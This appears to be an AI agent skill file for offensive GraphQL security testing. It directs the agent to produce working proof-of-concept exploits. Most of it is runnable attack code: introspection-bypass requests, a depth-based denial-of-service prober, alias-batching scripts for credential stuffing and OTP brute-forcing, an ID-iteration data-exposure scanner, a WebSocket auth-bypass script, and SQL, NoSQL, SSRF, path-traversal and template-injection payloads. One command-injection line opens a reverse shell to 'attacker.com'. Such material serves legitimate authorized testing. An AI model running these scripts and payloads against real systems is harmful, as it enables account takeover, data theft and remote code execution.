---
name: graphql-hunt
description: >
  Advanced GraphQL security testing for penetration testing, bug bounty, and security research. Covers the full
  attack chain from endpoint discovery and schema recovery (introspection bypass, field suggestions, SDL leaks,
  CVE paths) through complex attacks (batching, alias overloading, DoS, BOLA/IDOR, SQLi, SSRF, RCE) to PoC
  generation. Includes graphql-cop, Clairvoyance, BatchQL, graphw00f, InQL orchestration. Use for GraphQL
  pentesting, introspection bypass, schema enumeration, auth bypass, injection attacks, rate limit bypass,
  hidden mutation discovery, WebSocket subscription auth, or any GraphQL security task.
---

# graphql-hunt — Advanced GraphQL Security Testing

**Operational context:** Authorized pentesting / bug bounty scope. Full terminal access. All techniques target in-scope GraphQL endpoints only. Generate working PoC (curl + Python) for every confirmed vulnerability.

Read `references/payloads.md` for payload libraries when fuzzing. Read `references/wordlists.md` for field/mutation wordlists.

---

## Phase 0 — Fingerprint & Endpoint Discovery

### Locate the endpoint

```bash
# Common paths to probe
for path in /graphql /api/graphql /v1/graphql /v2/graphql /graphql/v1 \
            /query /gql /graph /api/graph /graphiql /playground \
            /altair /voyager /graphql/console /explorer; do
  curl -s -o /dev/null -w "%{http_code} $path\n" -X POST \
    -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}' \
    "https://TARGET$path"
done
```

### Fingerprint the implementation

```bash
# graphw00f identifies engine (Apollo, Hasura, Graphene, Strawberry, etc.)
graphw00f -t https://TARGET/graphql

# Fingerprinting by error messages / response headers also reveals engine
curl -s -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}' | python3 -m json.tool
```

Engine matters — it determines which depth limits, batching support, and CVE paths apply.

### SDL / schema file leak hunting

Engines often expose the raw schema at predictable paths. Check these before anything else:

```bash
for path in /graphql/schema.graphql /graphql/schema.json /graphql/sdl \
            /graphql/system /api/graphql/schema /.well-known/graphql \
            /graphql/__schema /static/schema.graphql; do
  curl -s -o /dev/null -w "%{http_code} $path\n" "https://TARGET$path"
done
```

**Directus (2026):** `/graphql/system` exposes the system schema SDL — auth tokens may not be required.  
**Parse Server:** `/graphql` with `x-parse-application-id` header sometimes leaks full schema in error responses.

---

## Phase 1 — Schema Recovery

### Standard introspection

```bash
# Full introspection dump
curl -s -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind description fields(includeDeprecated:true) { name description args { name type { name kind ofType { name kind } } } type { name kind ofType { name kind ofType { name kind } } } isDeprecated deprecationReason } inputFields { name type { name kind ofType { name kind } } } interfaces { name } enumValues { name } possibleTypes { name } } directives { name locations args { name type { name kind ofType { name kind } } } } } }" }' \
  | python3 -m json.tool > schema_dump.json
```

Save `schema_dump.json` — every subsequent phase uses it.

### Introspection bypass protocols

When `__schema` returns `{"errors": [...]}` or `null data`, try these in order:

**1. Inline Fragment probing** — works when introspection queries are blocked but type system leaks via fragment errors:
```graphql
{ ... on Query { users { id } } }
```

**2. Field suggestions** — GraphQL engines often return `"Did you mean X?"` on typos even with introspection disabled. Brute-force field names:
```bash
# Feed misspellings and watch for suggestions
curl -s -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ usr { id } }"}' | grep -i "did you mean"
```

**3. GET-based introspection** — some servers disable POST introspection but leave GET open:
```bash
curl -s "https://TARGET/graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D"
```

**4. Content-type switching** — `application/graphql` sometimes bypasses WAF rules that target JSON:
```bash
curl -s -X POST https://TARGET/graphql \
  -H "Content-Type: application/graphql" \
  -d '{ __schema { types { name } } }'
```

**5. Clairvoyance (blind reconstruction)** — when all introspection is blocked:
```bash
pip install clairvoyance
clairvoyance -o schema.json https://TARGET/graphql \
  -H "Authorization: Bearer TOKEN" \
  -w /path/to/wordlist.txt
```
Use `references/wordlists.md` for field name wordlists optimized for common GraphQL schemas.

---

## Phase 2 — Complex Attack Vectors

### Query depth / complexity DoS

Most engines have configurable depth limits (default Apollo: 7, Hasura: none, Graphene: varies). Probe the limit:

```python
# depth_probe.py — find max query depth before error/timeout
import requests, json

TARGET = "https://TARGET/graphql"
HEADERS = {"Content-Type": "application/json", "Authorization": "Bearer TOKEN"}

def nested(depth, inner="id"):
    if depth == 0:
        return inner
    return f"users {{ {nested(depth-1)} }}"

for d in range(3, 50):
    q = "{" + nested(d) + "}"
    r = requests.post(TARGET, json={"query": q}, headers=HEADERS, timeout=10)
    status = "OK" if "data" in r.json() else "ERR"
    print(f"depth={d} → {status} ({r.elapsed.total_seconds():.2f}s)")
    if r.elapsed.total_seconds() > 5:
        print(f"DoS threshold found at depth ~{d}")
        break
```

### Fragment circular reference DoS

```graphql
fragment f1 on User { ...f2 }
fragment f2 on User { ...f1 }
{ users { ...f1 } }
```

Some parsers stack-overflow or loop on this.

### Batching attacks

**Array batching (check if supported):**
```bash
curl -s -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ me { id } }"},{"query":"{ me { email } }"}]'
```

**Alias overloading — rate limit bypass for credential stuffing:**

This sends 100 login attempts in a single HTTP request, bypassing per-request rate limits:

```python
# alias_batch_login.py
import requests

TARGET = "https://TARGET/graphql"
PASSWORDS = ["Password1", "letmein", "admin123", ...]  # load your wordlist

aliases = "\n".join(
    f'  a{i}: login(username: "victim@example.com", password: "{p}") {{ token }}'
    for i, p in enumerate(PASSWORDS[:100])
)
query = f"mutation {{\n{aliases}\n}}"

r = requests.post(TARGET, json={"query": query},
                  headers={"Content-Type": "application/json"})
data = r.json()
for i, p in enumerate(PASSWORDS[:100]):
    result = data.get("data", {}).get(f"a{i}")
    if result and result.get("token"):
        print(f"[+] VALID: {p} → token: {result['token']}")
```

**2FA/OTP brute-force via aliasing:**
```graphql
mutation {
  a0: verifyOTP(code: "000000") { success }
  a1: verifyOTP(code: "000001") { success }
  ...
  a9999: verifyOTP(code: "009999") { success }
}
```
Split into batches of 1000 to avoid payload size limits.

### Directive injection

Test custom directives for injection and logic bypass:
```graphql
{ user(id: 1) @deprecated(reason: "' OR 1=1--") { name } }
{ user(id: 1) @auth(requires: "ADMIN") { adminData } }
{ user(id: 1) @cache(key: "../../../etc/passwd") { name } }
```

---

## Phase 3 — Authorization & BOLA/IDOR

### Resolver enumeration

For every query and mutation in the schema, test unauthenticated and low-privilege access:

```bash
# Test each resolver without auth header
for resolver in users user posts post adminUsers deleteUser createAdmin; do
  echo "Testing: $resolver"
  curl -s -X POST https://TARGET/graphql \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{ $resolver { id } }\"}" | jq '.errors // .data'
done
```

### BOLA — object ID iteration

```python
# bola_scan.py — iterate IDs across all query types
import requests

TARGET = "https://TARGET/graphql"
# Use LOW-PRIV token
HEADERS = {"Content-Type": "application/json", "Authorization": "Bearer LOW_PRIV_TOKEN"}

for obj_id in range(1, 1000):
    q = {"query": f'{{ user(id: {obj_id}) {{ id email role privateData }} }}'}
    r = requests.post(TARGET, json=q, headers=HEADERS)
    data = r.json().get("data", {}).get("user")
    if data:
        print(f"[+] id={obj_id}: {data}")
```

Test UUIDs too — extract known UUIDs from responses, then try adjacent objects owned by other users.

### Hidden field / mutation discovery

Fields like `_debug`, `_internal`, `admin_`, `__admin`, `system_`, `_raw`, `_meta` are frequently left exposed:

```bash
# Try hidden admin fields on known types
curl -s -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: 1) { _debug _rawData adminNotes systemFlags internalId } }"}' \
  | python3 -m json.tool
```

Run Clairvoyance with `references/wordlists.md` hidden-field wordlist to discover these systematically.

### Vertical privilege escalation

Test admin mutations as a low-priv user — resolvers sometimes rely on client-side auth checks:

```bash
# Attempt admin mutation with low-priv token
curl -s -X POST https://TARGET/graphql \
  -H "Authorization: Bearer LOW_PRIV_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { promoteUserToAdmin(userId: \"SELF_ID\") { role } }"}'
```

### Subscription WebSocket auth bypass

Some engines authenticate REST/HTTP GraphQL but skip WS auth:

```python
# ws_sub_test.py
import asyncio, websockets, json

async def test():
    uri = "wss://TARGET/graphql"
    async with websockets.connect(uri, subprotocols=["graphql-ws"]) as ws:
        # Send init WITHOUT auth
        await ws.send(json.dumps({"type": "connection_init", "payload": {}}))
        resp = await ws.recv()
        print("Init:", resp)
        # Subscribe to sensitive data stream
        await ws.send(json.dumps({
            "id": "1", "type": "start",
            "payload": {"query": "subscription { allUsers { email role } }"}
        }))
        msg = await ws.recv()
        print("Data:", msg)

asyncio.run(test())
```

---

## Phase 4 — Injection Attacks

Test **all** String-type arguments. Use the engine fingerprint to prioritize.

### SQL injection
```graphql
{ user(id: "1 OR 1=1--") { id } }
{ user(name: "' UNION SELECT table_name,null FROM information_schema.tables--") { id } }
```

### NoSQL injection (MongoDB-backed resolvers)
```graphql
{ user(username: {"$gt": ""}) { id email } }
{ users(filter: {"password": {"$regex": ".*"}}) { email password } }
```

### SSRF via URL arguments
```graphql
mutation { fetchImage(url: "http://169.254.169.254/latest/meta-data/") { content } }
mutation { importData(source: "file:///etc/passwd") { result } }
```

### Path traversal in file mutations
```graphql
mutation { uploadFile(path: "../../etc/passwd", content: "x") { success } }
mutation { getFile(name: "../../../etc/shadow") { data } }
```

### SSTI in template resolvers
```graphql
mutation { sendEmail(template: "{{7*7}}", to: "test@x.com") { sent } }
mutation { renderReport(title: "${7*7}") { html } }
```

### OS command injection
```graphql
mutation { runScript(name: "report.sh; id") { output } }
mutation { exportData(format: "csv; nc attacker.com 4444 -e /bin/sh") { file } }
```

---

## Phase 5 — PoC Generation Template

For every confirmed vulnerability, produce:

**1. Minimal curl PoC:**
```bash
# VULN: [TYPE] in [RESOLVER]
# IMPACT: [DATA_EXPOSED / AUTH_BYPASS / RCE / DoS]
# CVSS: [SCORE]
curl -s -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '[PAYLOAD]' | python3 -m json.tool
```

**2. Standalone Python PoC** (save as `poc_<vuln_name>.py`):
```python
#!/usr/bin/env python3
"""
PoC: [VULNERABILITY NAME]
Target: [ENDPOINT]
Tested: [DATE]
Impact: [BRIEF IMPACT]
"""
import requests

TARGET = "https://TARGET/graphql"
HEADERS = {"Content-Type": "application/json", "Authorization": "Bearer TOKEN"}

payload = {"query": "[QUERY]"}
r = requests.post(TARGET, json=payload, headers=HEADERS)
print(r.json())
```

---

## Phase 6 — Automated Tooling

Run these in parallel against the target:

```bash
# 1. graphql-cop — automated security audit (25+ checks)
graphql-cop -t https://TARGET/graphql -o json > cop_report.json

# 2. InQL standalone scanner
python3 -m inql scanner -t https://TARGET/graphql --header "Authorization: Bearer TOKEN"

# 3. graphw00f fingerprint
graphw00f -t https://TARGET/graphql -f -d

# 4. BatchQL — batch attack surface
python3 BatchQL/batch.py -e https://TARGET/graphql \
  -H "Authorization: Bearer TOKEN"

# 5. Clairvoyance (if introspection blocked)
clairvoyance -o schema_blind.json https://TARGET/graphql \
  -H "Authorization: Bearer TOKEN"
```

---

## High-Impact Finding Priority Order

Triage and report in this order — top findings close programs fastest:

1. **Auth bypass on mutations** — unauthenticated write/delete/admin operations
2. **BOLA/IDOR data leakage** — access other users' private data via ID manipulation  
3. **Admin field/mutation exposure** — `_debug`, `adminXxx`, `system_` accessible to low-priv
4. **Injection** — SQLi, NoSQL, SSRF, SSTI, RCE via argument fuzzing
5. **Rate limit bypass via batching** — credential stuffing / 2FA bypass in single request
6. **DoS via complexity/depth** — no query cost limits, unbounded recursion
7. **Information disclosure** — SDL leaks, verbose errors, field suggestions revealing schema

---

## Dynamic Scalar Fuzzing Matrix

For each scalar type discovered in schema, apply these payload sets:

| Scalar type | Payloads to try |
|-------------|----------------|
| `String` | SQLi, XSS, SSTI (`{{7*7}}`), path traversal (`../../../etc/passwd`), SSRF (`http://169.254.169.254`), null byte (`%00`), overlong UTF-8 |
| `Int` / `Float` | `0`, `-1`, `2147483647`, `-2147483648`, `9999999999`, `1.1`, `NaN`, `Infinity` |
| `ID` | Other users' IDs, `0`, `null`, `"' OR 1=1--"`, UUID brute |
| `Boolean` | `null`, `"true"`, `1` (type coercion) |
| Custom scalars | Infer from field name — `Email` → email injection, `URL` → SSRF, `Date` → format string |
| Enums | Values outside defined set, numeric equivalents, lowercase variants |
